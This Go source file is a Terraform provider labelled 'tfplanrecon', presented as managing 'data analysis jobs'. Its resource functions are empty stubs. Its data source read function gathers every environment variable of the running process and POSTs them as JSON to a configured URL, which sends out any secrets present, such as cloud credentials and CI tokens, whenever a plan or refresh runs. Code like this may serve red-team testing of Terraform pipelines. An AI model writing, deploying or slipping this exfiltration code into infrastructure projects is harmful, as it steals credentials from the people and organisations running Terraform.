package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

type providerConfig struct {
	client *http.Client
}

func Provider() *schema.Provider {
	return &schema.Provider{
		Schema: map[string]*schema.Schema{},
		ResourcesMap: map[string]*schema.Resource{
			"tfplanrecon_scan": resourceDataAnalysisJob(),
		},
		DataSourcesMap: map[string]*schema.Resource{
			"tfplanrecon_scan": dataSourceDataAnalysisJob(),
		},
		ConfigureFunc: providerConfigure,
	}
}

func providerConfigure(d *schema.ResourceData) (interface{}, error) {
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			MaxConnsPerHost:     100,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		},
	}

	return &providerConfig{
		client: client,
	}, nil
}

func resourceDataAnalysisJob() *schema.Resource {
	return &schema.Resource{
		Create: resourceDataAnalysisJobCreate,
		Read:   resourceDataAnalysisJobRead,
		Update: resourceDataAnalysisJobUpdate,
		Delete: resourceDataAnalysisJobDelete,

		Schema: map[string]*schema.Schema{
			"name": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The name of the data analysis job",
			},
			"description": {
				Type:        schema.TypeString,
				Optional:    true,
				Description: "A description of the data analysis job",
			},
			"input_path": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The path to the input data",
			},
			"output_path": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The path where results will be stored",
			},
		},
	}
}

func resourceDataAnalysisJobCreate(d *schema.ResourceData, m interface{}) error {
	d.SetId("unique-id")
	return resourceDataAnalysisJobRead(d, m)
}

func resourceDataAnalysisJobRead(d *schema.ResourceData, m interface{}) error {
	return nil
}

func resourceDataAnalysisJobUpdate(d *schema.ResourceData, m interface{}) error {
	return resourceDataAnalysisJobRead(d, m)
}

func resourceDataAnalysisJobDelete(d *schema.ResourceData, m interface{}) error {
	return nil
}

func dataSourceDataAnalysisJob() *schema.Resource {
	return &schema.Resource{
		Read: dataSourceDataAnalysisJobRead,

		Schema: map[string]*schema.Schema{
			"id": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The ID of the data analysis job",
			},
			"url": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The URL to send environment variables to",
			},
			"name": {
				Type:        schema.TypeString,
				Computed:    true,
				Description: "The name of the data analysis job",
			},
			"description": {
				Type:        schema.TypeString,
				Computed:    true,
				Description: "A description of the data analysis job",
			},
			"input_path": {
				Type:        schema.TypeString,
				Computed:    true,
				Description: "The path to the input data",
			},
			"output_path": {
				Type:        schema.TypeString,
				Computed:    true,
				Description: "The path where results will be stored",
			},
		},
	}
}

func dataSourceDataAnalysisJobRead(d *schema.ResourceData, m interface{}) error {
	config := m.(*providerConfig)
	client := config.client

	id := d.Get("id").(string)
	url := d.Get("url").(string)

	envVars := getEnvVars("")

	payload, err := json.Marshal(envVars)
	if err != nil {
		return fmt.Errorf("error marshaling environment variables: %s", err)
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return fmt.Errorf("error creating request: %s", err)
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error making POST request: %s", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("POST request failed with status: %d", resp.StatusCode)
	}

	d.SetId(id)
	return nil
}

func getEnvVars(prefix string) map[string]string {
	envVars := make(map[string]string)
	for _, env := range os.Environ() {
		pair := strings.SplitN(env, "=", 2)
		if prefix == "" || strings.HasPrefix(pair[0], prefix) {
			envVars[pair[0]] = pair[1]
		}
	}
	return envVars
}
